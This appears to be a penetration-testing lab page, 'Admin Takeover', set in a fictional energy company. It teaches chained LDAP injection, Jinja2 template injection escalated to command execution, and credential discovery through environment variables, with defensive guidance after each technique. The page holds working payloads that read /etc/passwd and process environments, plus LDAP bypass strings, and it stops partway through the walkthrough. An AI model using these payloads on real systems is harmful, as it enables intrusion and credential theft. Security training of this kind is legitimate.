+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-meg41-admin-takeover">Exercise MEG4.1: Admin Takeover</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>The Meridian Energy engagement reaches its final target. Chapters 1 through 3 established network access, compromised web applications, exploited infrastructure services, and collected credentials from every system you touched. The IT administration portal is the last critical system on the engagement scope. Compromising it means full control over Meridian Energy's IT infrastructure and, through the engineering database, access to SCADA controller configurations and operational secrets.</p>
+<p>The exercise chains four distinct vulnerability classes. Each phase depends on information extracted from the previous one. There are no independent attack paths. You must complete Phase 1 before Phase 2 is possible, Phase 2 before Phase 3, and Phase 3 before Phase 4. Read carefully, document everything, and pay attention to error messages. They contain clues.</p>
+<p>Make sure you have:</p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Completed all prior Meridian Energy exercises (Chapters 1-3)</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> VPN connected and verified</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Terminal open with curl, python3, and psql available</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Browser available for manual testing</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Understanding of LDAP query syntax (review the Background section before starting)</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Familiarity with Jinja2 template syntax (review the Tool Primer section before starting)</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Notebook ready for recording findings at every phase</li>
+</ul>
+<h2 id="engagement-status">Engagement Status</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>[Recon] -&gt; [Web Exploit] -&gt; [Infrastructure] -&gt; &gt;&gt; Admin Takeover &lt;&lt;
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network Reconnaissance</td>
+<td>Complete (Chapter 1)</td>
+</tr>
+<tr>
+<td>Web Exploitation</td>
+<td>Complete (Chapter 2)</td>
+</tr>
+<tr>
+<td>Infrastructure Attacks</td>
+<td>Complete (Chapter 3)</td>
+</tr>
+<tr>
+<td><strong>Admin Takeover</strong></td>
+<td><strong>Active - Final Phase</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>What you know so far:</strong> Four chapters of engagement have mapped the entire Meridian Energy network, compromised the employee portal and HR system, exploited path traversal on the file server, chained API vulnerabilities on the SCADA monitoring system, and collected credentials for multiple employee accounts. One target remains: the IT administration portal and its backend engineering database.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Meridian Energy Group's IT administration portal is the central management interface for the corporate network. Senior IT staff use it to provision user accounts, manage system configurations, generate compliance reports, and access engineering data. The portal authenticates against an LDAP directory server, where all employee credentials and organizational unit assignments are stored.</p>
+<p>The administration portal includes a Report Generator feature built with Python and Jinja2 templates. Administrators enter report parameters into a web form, and the server renders the report using Jinja2's template engine. The rendered output includes data pulled from the engineering database, formatted according to the template.</p>
+<p>Behind the admin portal sits the engineering database: a PostgreSQL instance that stores SCADA controller configurations, maintenance schedules, firmware versions, and operational secrets for every power generation facility in the Meridian Energy network. Access to the engineering database requires credentials that are stored in the admin portal's environment variables.</p>
+<p>Sarah Chen, the Chief Information Security Officer, has an LDAP account. During earlier reconnaissance, you discovered her username (<code>s.chen</code>) but not her password. What you do know is that the LDAP server may be vulnerable to authentication bypass through wildcard injection.</p>
+<p><strong>Your mission:</strong> Chain LDAP injection, server-side template injection, credential discovery, and lateral movement to reach the engineering database and extract the master flag.</p>
+<p><strong>Credentials for this exercise:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Role</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>s.chen</td>
+<td>* (LDAP wildcard)</td>
+<td>CISO</td>
+<td>Use wildcard for LDAP injection bypass</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Target systems:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Hostname</th>
+<th>IP Offset</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>admin.meridian-energy.corp</td>
+<td>+10</td>
+<td>IT administration portal</td>
+</tr>
+<tr>
+<td>api.meridian-energy.corp</td>
+<td>+11</td>
+<td>Monitoring REST API</td>
+</tr>
+<tr>
+<td>ldap.meridian-energy.corp</td>
+<td>+12</td>
+<td>LDAP directory server</td>
+</tr>
+<tr>
+<td>eng-db.meridian-energy.corp</td>
+<td>+11</td>
+<td>Engineering PostgreSQL database</td>
+</tr>
+</tbody>
+</table>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Access the admin portal and identify the LDAP authentication mechanism</li>
+<li>Bypass LDAP authentication using wildcard injection</li>
+<li>Discover and exploit server-side template injection in the Report Generator</li>
+<li>Extract engineering database credentials from the application environment</li>
+<li>Connect to the engineering database and retrieve the master flag</li>
+<li>Document the complete four-phase attack chain with evidence at each step</li>
+</ul>
+<h2 id="flag-progress">Flag Progress</h2>
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>Technique</th>
+<th>Target</th>
+<th>Outcome</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>LDAP Injection</td>
+<td>admin.meridian-energy.corp</td>
+<td>Authentication bypass</td>
+</tr>
+<tr>
+<td>2</td>
+<td>SSTI Discovery</td>
+<td>Report Generator</td>
+<td>Code execution confirmed</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Credential Discovery</td>
+<td>Environment variables</td>
+<td>DB credentials extracted</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Lateral Movement</td>
+<td>eng-db.meridian-energy.corp</td>
+<td>Master flag retrieved</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="background-the-four-techniques">Background: The Four Techniques</h2>
+<p>The capstone exercise requires understanding four distinct vulnerability classes. Each section below explains the theory, provides examples, and describes real-world impact. Read all four sections before starting the walkthrough. Understanding the theory makes the exploitation intuitive rather than mechanical.</p>
+<h3 id="ldap-injection">LDAP Injection</h3>
+<p>The Lightweight Directory Access Protocol (LDAP) is a standard protocol for accessing directory services. Corporate environments use LDAP servers (Active Directory, OpenLDAP) to store user accounts, group memberships, organizational units, and authentication credentials. Web applications authenticate users by constructing LDAP queries from form input and checking whether the query returns a valid entry.</p>
+<p><strong>How LDAP authentication works:</strong></p>
+<p>When a user submits a login form with username <code>s.chen</code> and password <code>SecurePass123</code>, the application constructs an LDAP search filter:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>(&amp;(uid=s.chen)(userPassword=SecurePass123))
+</code></pre></div>
+<p>The <code>&amp;</code> operator means AND: the query returns results only if both conditions match. The LDAP server searches the directory for an entry where <code>uid</code> equals <code>s.chen</code> AND <code>userPassword</code> equals <code>SecurePass123</code>. If exactly one entry matches, authentication succeeds.</p>
+<p><strong>How LDAP injection works:</strong></p>
+<p>LDAP supports wildcard characters. The asterisk <code>*</code> matches any value. If the application inserts user input directly into the LDAP filter without sanitization, an attacker can use <code>*</code> as the password:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>(&amp;(uid=s.chen)(userPassword=*))
+</code></pre></div>
+<p>The <code>*</code> matches any password value. The query returns the entry for <code>s.chen</code> regardless of the actual password, because every entry has some value in the <code>userPassword</code> field, and <code>*</code> matches all of them.</p>
+<p><strong>More advanced LDAP injection payloads:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Payload (password field)</th>
+<th>Resulting Filter</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>*</code></td>
+<td><code>(&amp;(uid=s.chen)(userPassword=*))</code></td>
+<td>Bypass password check</td>
+</tr>
+<tr>
+<td><code>*)(uid=*))(|(uid=*</code></td>
+<td><code>(&amp;(uid=s.chen)(userPassword=*)(uid=*))(|(uid=*))</code></td>
+<td>Return all entries</td>
+</tr>
+<tr>
+<td><code>*)(objectClass=*</code></td>
+<td><code>(&amp;(uid=s.chen)(userPassword=*)(objectClass=*))</code></td>
+<td>Match any object class</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Real-world impact:</strong></p>
+<p>LDAP injection has been found in enterprise applications including:</p>
+<ul>
+<li>Cisco Unity Connection (CVE-2024-20252)</li>
+<li>Fortra GoAnywhere MFT (CVE-2024-0204)</li>
+<li>Multiple healthcare and energy sector SCADA management interfaces</li>
+</ul>
+<p><strong>Defense:</strong></p>
+<ul>
+<li>Use LDAP bind operations instead of search filters for authentication (bind operations pass the password to the LDAP server for verification rather than embedding it in a search query)</li>
+<li>Escape special LDAP characters (<code>*</code>, <code>(</code>, <code>)</code>, <code>\</code>, NUL) in user input using a library function like <code>ldap.filter.escape_filter_chars()</code> in Python</li>
+<li>Validate input format before constructing queries (usernames should match <code>^[a-zA-Z0-9._-]+$</code>)</li>
+</ul>
+<h3 id="server-side-template-injection-ssti">Server-Side Template Injection (SSTI)</h3>
+<p>Template engines generate dynamic content by combining a template (containing placeholders) with data. Jinja2 is a popular Python template engine used by Flask, Django (optionally), and many custom applications. When user input is inserted into a template string that gets compiled and rendered, the attacker can inject template syntax that executes arbitrary code.</p>
+<p><strong>How Jinja2 templates work:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Template</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># Safe: user data is passed as a variable</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">template</span> <span class="o">=</span> <span class="n">Template</span><span class="p">(</span><span class="s2">&quot;Hello, {{ name }}!&quot;</span><span class="p">)</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="n">output</span> <span class="o">=</span> <span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="n">user_input</span><span class="p">)</span>  <span class="c1"># user_input is treated as data</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c1"># Vulnerable: user input IS the template</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="n">template</span> <span class="o">=</span> <span class="n">Template</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Report for: </span><span class="si">{</span><span class="n">user_input</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># user_input is compiled as template code</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="n">output</span> <span class="o">=</span> <span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
+</code></pre></div>
+<p>In the safe pattern, <code>user_input</code> is passed as a variable and never interpreted as template syntax. In the vulnerable pattern, <code>user_input</code> is concatenated into the template string before compilation. If <code>user_input</code> contains <code>{{7*7}}</code>, Jinja2 compiles and evaluates it, producing <code>49</code>.</p>
+<p><strong>SSTI detection payloads:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Expected Output</th>
+<th>Confirms</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>{{7*7}}</code></td>
+<td><code>49</code></td>
+<td>Template expression evaluation</td>
+</tr>
+<tr>
+<td><code>{{7*'7'}}</code></td>
+<td><code>7777777</code></td>
+<td>String multiplication (Python-specific)</td>
+</tr>
+<tr>
+<td><code>{{'test'.upper()}}</code></td>
+<td><code>TEST</code></td>
+<td>Method call execution</td>
+</tr>
+<tr>
+<td><code>{{config}}</code></td>
+<td>Application config object</td>
+<td>Access to Flask config</td>
+</tr>
+<tr>
+<td><code>{{config.items()}}</code></td>
+<td>Config key-value pairs</td>
+<td>Enumerate configuration</td>
+</tr>
+</tbody>
+</table>
+<p><strong>SSTI to Remote Code Execution (RCE):</strong></p>
+<p>Jinja2 runs in a sandboxed environment that restricts direct access to Python builtins. However, the sandbox can be escaped by traversing Python's Method Resolution Order (MRO) to reach the <code>os</code> module:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a># Step 1: Access the string class
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>{{&#39;&#39;.__class__}}
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a># Output: &lt;class &#39;str&#39;&gt;
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a># Step 2: Access the base class (object)
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>{{&#39;&#39;.__class__.__mro__}}
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a># Output: (&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a># Step 3: Access subclasses of object
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>{{&#39;&#39;.__class__.__mro__[1].__subclasses__()}}
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a># Output: [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, ... hundreds of classes ...]
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a># Step 4: Find a class that imports os (e.g., warnings.catch_warnings)
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a># The index varies by Python version. An alternative approach uses cycler:
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>{{cycler.__init__.__globals__.os.popen(&#39;id&#39;).read()}}
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a># Output: uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div>
+<p>The <code>cycler</code> class is a Jinja2 global that provides access to Python's <code>os</code> module through its <code>__init__.__globals__</code> dictionary. The <code>os.popen()</code> method executes a shell command and returns its output.</p>
+<p><strong>Defense:</strong></p>
+<ul>
+<li>Never concatenate user input into template strings</li>
+<li>Pass user data as template variables using <code>template.render(data=user_input)</code></li>
+<li>Use a sandboxed Jinja2 environment (<code>jinja2.sandbox.SandboxedEnvironment</code>) that restricts attribute access</li>
+<li>Validate and sanitize user input to reject template syntax characters (<code>{</code>, <code>}</code>, <code>%</code>, <code>#</code>)</li>
+</ul>
+<h3 id="lateral-movement-via-credential-discovery">Lateral Movement via Credential Discovery</h3>
+<p>Once an attacker achieves code execution on a server, the next step is usually credential discovery. Applications store database credentials, API keys, and service account passwords in environment variables, configuration files, and container orchestration secrets.</p>
+<p><strong>Common credential locations:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Access Method</th>
+<th>Typical Contents</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Environment variables</td>
+<td><code>os.environ</code> or <code>/proc/self/environ</code></td>
+<td>Database URLs, API keys, secret tokens</td>
+</tr>
+<tr>
+<td>Configuration files</td>
+<td><code>/app/config.py</code>, <code>/etc/app/settings.ini</code></td>
+<td>DB credentials, LDAP bind passwords</td>
+</tr>
+<tr>
+<td>Docker secrets</td>
+<td><code>/run/secrets/*</code></td>
+<td>Mounted secret files</td>
+</tr>
+<tr>
+<td><code>.env</code> files</td>
+<td><code>/app/.env</code></td>
+<td>Application configuration</td>
+</tr>
+<tr>
+<td>Container labels</td>
+<td>Docker API</td>
+<td>Service discovery metadata</td>
+</tr>
+</tbody>
+</table>
+<p>In Jinja2 SSTI, environment variables are accessible through multiple paths:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a># Flask config (if the app is Flask-based)
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>{{config.items()}}
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a># Direct os.environ access
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>{{cycler.__init__.__globals__.os.environ}}
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a># Process environment via /proc
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>{{cycler.__init__.__globals__.os.popen(&#39;cat /proc/self/environ&#39;).read()}}
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a># Request environment (WSGI variables)
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>{{request.environ}}
+</code></pre></div>
+<h3 id="postgresql-one-liners">PostgreSQL One-Liners</h3>
+<p>Once database credentials are discovered, the attacker connects to the database to extract sensitive data. PostgreSQL provides the <code>psql</code> command-line client for direct database access.</p>
+<p><strong>Common psql commands:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Connect and run a query</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nv">PGPASSWORD</span><span class="o">=</span>pass<span class="w"> </span>psql<span class="w"> </span>-h<span class="w"> </span>hostname<span class="w"> </span>-U<span class="w"> </span>username<span class="w"> </span>-d<span class="w"> </span>database<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;SELECT * FROM table&quot;</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># Connect and get just the data (no headers/footers)</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="nv">PGPASSWORD</span><span class="o">=</span>pass<span class="w"> </span>psql<span class="w"> </span>-h<span class="w"> </span>hostname<span class="w"> </span>-U<span class="w"> </span>username<span class="w"> </span>-d<span class="w"> </span>database<span class="w"> </span>-t<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;SELECT column FROM table&quot;</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c1"># List all tables</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="nv">PGPASSWORD</span><span class="o">=</span>pass<span class="w"> </span>psql<span class="w"> </span>-h<span class="w"> </span>hostname<span class="w"> </span>-U<span class="w"> </span>username<span class="w"> </span>-d<span class="w"> </span>database<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;\dt&quot;</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="c1"># Describe a table&#39;s columns</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="nv">PGPASSWORD</span><span class="o">=</span>pass<span class="w"> </span>psql<span class="w"> </span>-h<span class="w"> </span>hostname<span class="w"> </span>-U<span class="w"> </span>username<span class="w"> </span>-d<span class="w"> </span>database<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;\d table_name&quot;</span>
+</code></pre></div>
+<p>The <code>-t</code> flag (tuples only) suppresses column headers and row count footers, returning only the data. Combined with <code>-c</code> (command), it provides clean output suitable for scripting.</p>
+<p>The <code>PGPASSWORD</code> environment variable passes the password without an interactive prompt. In production, <code>.pgpass</code> files or connection strings are preferred, but <code>PGPASSWORD</code> is practical for one-off queries during a penetration test.</p>
+<hr />
+<h2 id="tool-primer-ldap-query-syntax">Tool Primer: LDAP Query Syntax</h2>
+<p>Understanding LDAP filter syntax is essential for crafting injection payloads. LDAP filters use prefix notation with boolean operators.</p>
+<p><strong>Filter operators:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Operator</th>
+<th>Syntax</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Equality</td>
+<td><code>(uid=s.chen)</code></td>
+<td>uid equals s.chen</td>
+</tr>
+<tr>
+<td>Wildcard</td>
+<td><code>(uid=s*)</code></td>
+<td>uid starts with s</td>
+</tr>
+<tr>
+<td>AND</td>
+<td><code>(&amp;(uid=s.chen)(role=admin))</code></td>
+<td>Both conditions must match</td>
+</tr>
+<tr>
+<td>OR</td>
+<td><code>(\|(uid=s.chen)(uid=admin))</code></td>
+<td>Either condition matches</td>
+</tr>
+<tr>
+<td>NOT</td>
+<td><code>(!(uid=guest))</code></td>
+<td>uid is not guest</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Special characters that affect filter parsing:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Meaning</th>
+<th>Escaped Form</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>*</code></td>
+<td>Wildcard (matches any value)</td>
+<td><code>\2a</code></td>
+</tr>
+<tr>
+<td><code>(</code></td>
+<td>Opens filter group</td>
+<td><code>\28</code></td>
+</tr>
+<tr>
+<td><code>)</code></td>
+<td>Closes filter group</td>
+<td><code>\29</code></td>
+</tr>
+<tr>
+<td><code>\</code></td>
+<td>Escape character</td>
+<td><code>\5c</code></td>
+</tr>
+<tr>
+<td>NUL</td>
+<td>Null byte</td>
+<td><code>\00</code></td>
+</tr>
+</tbody>
+</table>
+<p>When an application fails to escape these characters in user input, the attacker can modify the filter logic.</p>
+<h2 id="tool-primer-jinja2-ssti-payloads">Tool Primer: Jinja2 SSTI Payloads</h2>
+<p>A progression of payloads from detection to exploitation:</p>
+<p><strong>Detection (confirm SSTI exists):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>{{7*7}}                          -&gt; 49
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>{{7*&#39;7&#39;}}                        -&gt; 7777777
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>{{&#39;hello&#39;|upper}}                -&gt; HELLO
+</code></pre></div>
+<p><strong>Information gathering (read application data):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>{{config}}                       -&gt; Flask config object
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>{{config.items()}}               -&gt; All config key-value pairs
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>{{request.environ}}              -&gt; WSGI environment variables
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>{{self.__class__.__name__}}      -&gt; Template class name
+</code></pre></div>
+<p><strong>Remote code execution (execute system commands):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a># Via cycler (Jinja2 global)
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>{{cycler.__init__.__globals__.os.popen(&#39;id&#39;).read()}}
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a># Via joiner (another Jinja2 global)
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>{{joiner.__init__.__globals__.os.popen(&#39;whoami&#39;).read()}}
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a># Via namespace
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>{{namespace.__init__.__globals__.os.popen(&#39;ls /&#39;).read()}}
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a># Via lipsum (Jinja2 utility)
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>{{lipsum.__globals__.os.popen(&#39;cat /etc/passwd&#39;).read()}}
+</code></pre></div>
+<p><strong>Reading environment variables:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a># All environment variables as a dictionary
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>{{cycler.__init__.__globals__.os.environ}}
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a># Specific environment variable
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>{{cycler.__init__.__globals__.os.environ.get(&#39;DATABASE_URL&#39;)}}
+</code></pre></div>
+<p><strong>Complex command execution (chained commands):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a># Pipe commands
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>{{cycler.__init__.__globals__.os.popen(&#39;cat /etc/passwd | grep root&#39;).read()}}
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a># Multiple commands with semicolons
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>{{cycler.__init__.__globals__.os.popen(&#39;id; whoami; hostname&#39;).read()}}
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a># Database query via psql
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>{{cycler.__init__.__globals__.os.popen(&#39;PGPASSWORD=pass psql -h host -U user -d db -t -c &quot;SELECT 1&quot;&#39;).read()}}
+</code></pre></div>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<p>The walkthrough is organized into four phases matching the attack chain. Each phase builds on the output of the previous one. Do not skip ahead. Document your findings at each step because you will need them later.</p>
+<pre class="mermaid"><code>graph TD
+    A["Phase 1&lt;br/&gt;LDAP Injection"] --&gt;|"Authenticated session"| B["Phase 2&lt;br/&gt;SSTI Discovery"]
+    B --&gt;|"Code execution"| C["Phase 3&lt;br/&gt;Credential Discovery"]
+    C --&gt;|"DB credentials"| D["Phase 4&lt;br/&gt;Lateral Movement"]
+    D --&gt;|"Flag extracted"| E["Engagement&lt;br/&gt;Complete"]
+
+    style A fill:#00d4ff,color:#000
+    style B fill:#6aaa64,color:#fff
+    style C fill:#e94560,color:#fff
+    style D fill:#ffd700,color:#000
+    style E fill:#ff6b6b,color:#fff</code></pre>
+<hr />
+<h3 id="phase-1-ldap-injection-bypassing-authentication">Phase 1: LDAP Injection - Bypassing Authentication</h3>
+<p>The admin portal authenticates against an LDAP directory server. The login form accepts a username and password, constructs an LDAP search filter, and checks whether the filter returns a valid entry. The application does not sanitize the password field before inserting it into the LDAP filter, making it vulnerable to wildcard injection.</p>
+<h4 id="step-1-launch-the-exercise">Step 1: Launch the Exercise</h4>
+<p>Navigate to the platform and launch the <strong>Admin Takeover</strong> exercise (MEG4.1). Note the target IP addresses displayed in the Active Lab View. Four containers start: the admin portal, the LDAP server, the engineering database, and the corporate database.</p>
+<h4 id="step-2-configure-host-resolution">Step 2: Configure Host Resolution</h4>
+<p>Add the target hostnames to your <code>/etc/hosts</code> file:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Add target hostnames to /etc/hosts</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;subnet&gt;.10  admin.meridian-energy.corp&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
